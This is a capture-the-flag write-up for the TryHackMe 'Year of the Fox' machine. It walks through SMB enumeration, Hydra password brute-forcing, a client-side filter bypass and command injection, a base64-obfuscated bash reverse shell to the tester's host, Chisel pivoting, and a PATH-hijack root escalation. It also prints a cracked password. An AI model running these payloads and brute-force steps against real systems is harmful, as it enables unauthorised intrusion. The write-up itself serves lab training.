title: "THM: Year of the Fox Writeup"
| **Machine**             | \[Year of the Fox]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | TryHackMe                                                                                                                    |
| **Difficulty**          | Hard                                                                                                                           |
| **Key Concept**         |  `Enumeration, Null SMB Sessions, HTTP Basic Auth Brute-Force, Command Injection, Client-Side Filter Bypass, Reverse Shell, Pivoting, Chisel, Hydra Brute-Force, Sudo Privilege Escalation, PATH Hijacking` |

# Enumeration

Running nmap shows HTTP and SMB ports open. We also get a domain name, which we’ll add to /etc/hosts:

```bash
└─$ sudo nmap -sCV 10.10.227.178 -p- --min-rate=1000 -oN nmap_long
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-07 06:48 EDT
Nmap scan report for 10.10.227.178
Host is up (0.050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -19m54s, deviation: 34m38s, median: 4s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2025-08-07T11:50:15+01:00
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-08-07T10:50:14
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

```bash
echo "10.10.227.178 year-of-the-fox.lan" | sudo tee -a /etc/hosts
```


SMB null session allows us to list shares, but no read or write access:

```bash
└─$ nxc smb 10.10.227.178 -u '' -p '' --shares
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  [*] Unix - Samba (name:YEAR-OF-THE-FOX) (domain:lan) (signing:False) (SMBv1:True) 
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  [+] lan\: (Guest)
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  [*] Enumerated shares
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  Share           Permissions     Remark
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  -----           -----------     ------
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  yotf                            Fox's Stuff -- keep out!
SMB         10.10.227.178   445    YEAR-OF-THE-FOX  IPC$                            IPC Service (year-of-the-fox server (Samba, Ubuntu))
```

Visiting the Website it prompts for login:

<img width="1632" height="480" alt="2025-08-07 132019" src="https://github.com/user-attachments/assets/c7c1a1a9-8b6f-477e-bf4a-91e894a81401" />

Looks like we gotta run up hydra and bruteforce, but first we need a valid username.

# User Enumeration

Using enum4linux, we find two users: fox and rascal.

<img width="1258" height="654" alt="2025-08-07 142135" src="https://github.com/user-attachments/assets/dc210c61-b542-476b-809d-0c19e9db75e0" />

Now we can use hydra to brute-force with rockyou.txt:

<img width="2916" height="225" alt="2025-08-07 142235" src="https://github.com/user-attachments/assets/236e4d89-41f4-4185-b411-d1de8dece407" />

Credentials work. Logged into the site:

<img width="2922" height="1560" alt="2025-08-07 142420" src="https://github.com/user-attachments/assets/c98fe106-3f6b-46d5-8009-6b1cf7e6d55e" />


The search function shows available files:

<img width="1554" height="876" alt="2025-08-07 142541" src="https://github.com/user-attachments/assets/7ed6f692-3c91-4fdd-89b3-10fc091dd24c" />

Special characters are filtered with filter.js script but it's a client-side filter, so we can bypass it using BurpSuite.
# Foothold

I intercept the request and inject a payload to test and reach my listener:

<img width="2873" height="1074" alt="2025-08-07 154848" src="https://github.com/user-attachments/assets/f6b308c7-df81-42b9-8de3-5df4b4c44c83" />

Command injection confirmed, so we can create a payload now and get a shell. But I Tried multiple reverse shell payloads and all of them didn’t work for unknown reasons. Eventually i created a base64 encoded one and it worked.

```bash
echo 'YmFzaCAtYyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMS4xMDQvOTAwMSAwPiYxIgo=' | base64 -d  | bash
```

So i started a listener on port 9001 and sent this payload in burpsuite, and finally got a shell after alot of struggle.
<img width="2792" height="331" alt="2025-08-07 160737" src="https://github.com/user-attachments/assets/1c01a4ea-21d0-4805-aa39-9f2e617750f8" />


Grabbed the first flag

```bash
www-data@year-of-the-fox:/var/www$ cat web-flag.txt
cat web-flag.txt
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}

```

# Lateral Movement

In /var/www/files, we find creds2.txt, base32 and base64-encoded

```bash
cat creds2.txt 
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2...
```

Tried decoding it but nothing clear yet.

Next, I notice port 22 is open internally only. Time to pivot.
<img width="1486" height="635" alt="2025-08-07 163258" src="https://github.com/user-attachments/assets/8d9dfe80-acc9-4dbb-b918-684f4911e4bc" />


I spent an hour trying to create a tunnel with Ligolo-ng, which had greatly helped me during the CPTS certification. However on this machine the agent kept dropping and eventually, I had to give up and move on to using Chisel

```bash

└─$ ./chisel server -p 8000 --reverse                      
2025/08/07 12:06:19 server: Reverse tunnelling enabled
2025/08/07 12:06:19 server: Fingerprint 47eCcC0uZgpsf4lK8RnE/pkRI2bwdD2tIemwMkz4AOY=
2025/08/07 12:06:19 server: Listening on http://0.0.0.0:8000
2025/08/07 12:06:52 server: session#1: tun: proxy#R:22=>localhost:22: Listening

```
```bash
www-data@year-of-the-fox:/tmp$ ./chisel client 10.9.1.104:8000 R:2222:localhost:22
<./chisel client 10.9.1.104:8000 R:2222:localhost:22
2025/08/07 17:09:13 client: Connecting to ws://10.9.1.104:8000
2025/08/07 17:09:14 client: Connected (Latency 50.894322ms)

```

Tunnel works. Now i can brute-force SSH from my kali machine for the fox user, which we discovered previously.

```bash
─$ hydra -l fox -P /usr/share/wordlists/rockyou.txt  ssh://127.0.0.1 -s 2222 -I -t64    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-07 12:11:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: fox   password: katrina
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-07 12:11:06
```
Hydra succesfully brute forced the password, we can use it to autenticate to SSH service.

```bash
fox@year-of-the-fox:~$ id
uid=1000(fox) gid=1000(fox) groups=1000(fox),114(sambashare)
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{REDACTED}
fox@year-of-the-fox:~$ 
```

# Privilege Escalation

First i checked for commands we can run as sudo
```bash
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
   env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
  (root) NOPASSWD: /usr/sbin/shutdown
```

I found [this](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation) article about abusing shutdown binary to get root.

>If we can execute **"shutdown"** command as root, we can gain access to privileges by overwriting the path of **"poweroff"**.

I followed the steps and got root:

```bash
fox@year-of-the-fox:~$ echo "/bin/bash > /tmp/poweroff"
/bin/bash > /tmp/poweroff
fox@year-of-the-fox:~$ cd /tmp
fox@year-of-the-fox:/tmp$ ls
systemd-private-fb4081ec563e477394e51caedff63066-apache2.service-YaXL2H  systemd-private-fb4081ec563e477394e51caedff63066-systemd-resolved.service-ozvax5  systemd-private-fb4081ec563e477394e51caedff63066-systemd-timesyncd.service-cZ2OUe
fox@year-of-the-fox:/tmp$ echo /bin/sh > /tmp/poweroff
fox@year-of-the-fox:/tmp$ chmod +x /tmp/poweroff 
fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown
 id
uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
Not here -- go find!

```

Root flag is not in /root, like it says in the /root/root.txt file. After some digging, I find it in /home/rascal/.

Box done.
